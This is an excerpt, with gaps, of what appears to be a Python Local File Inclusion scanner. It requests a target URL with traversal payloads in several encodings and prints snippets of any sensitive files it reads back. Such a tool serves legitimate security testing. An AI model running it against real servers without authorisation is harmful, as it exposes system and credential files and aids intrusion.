...
base_url = input(Fore.YELLOW + "Enter target URL (e.g., http://example.com/page): " + Style.RESET_ALL)
...
def check_lfi(url):
    print(Fore.CYAN + f"\nChecking LFI at: {url}" + Style.RESET_ALL)
    headers = {
    ...
    for path in lfi_payloads:
        for file in file_targets:
            for encoding in additional_encodings:
                ...
                print(Fore.GREEN + f"[*] Trying payload: {full_url}" + Style.RESET_ALL)
                    ...
                    if response.status_code == 200:
                        for filename, pattern in sensitive_patterns.items():
                            if filename in file and pattern.search(response.text):
                                print(Fore.RED + f"[+] Potential LFI found at: {full_url}" + Style.RESET_ALL)
                                print(Fore.RED + f"    File found: {filename}" + Style.RESET_ALL)
                                print(Fore.RED + f"    Snippet: {response.text[:500]}..." + Style.RESET_ALL) 
                                return  

                    if end_time - start_time > 3:  
                        print(Fore.YELLOW + f"[+] Possible time-based LFI at: {full_url} (response delay)" + Style.RESET_ALL)

                except requests.exceptions.RequestException as e:
                    print(Fore.RED + f"[!] Error accessing: {full_url} | Error: {e}" + Style.RESET_ALL)

    print(Fore.CYAN + "Check complete. No LFI vulnerabilities found." + Style.RESET_ALL)
